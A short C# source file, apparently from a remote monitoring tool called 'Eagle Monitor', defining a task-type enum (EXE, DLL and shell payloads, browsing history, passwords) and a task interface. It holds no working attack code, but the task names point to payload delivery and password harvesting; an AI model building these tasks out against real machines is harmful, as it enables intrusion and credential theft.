
/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_Tasks_Configurator
{

    public enum TaskType : byte
    {
        TT_PAYLOAD_EXE =        0,
        TT_PAYLOAD_DLL =        1,
        TT_PAYLOAD_SHELL =      2,
        TT_HISTORY =            3,
        TT_PASSWORD  =          4
    }

    public interface ITasks
    {
        TaskType taskType { get; set; }
        string name { get; set; }
        string description { get; set; }
    }
}
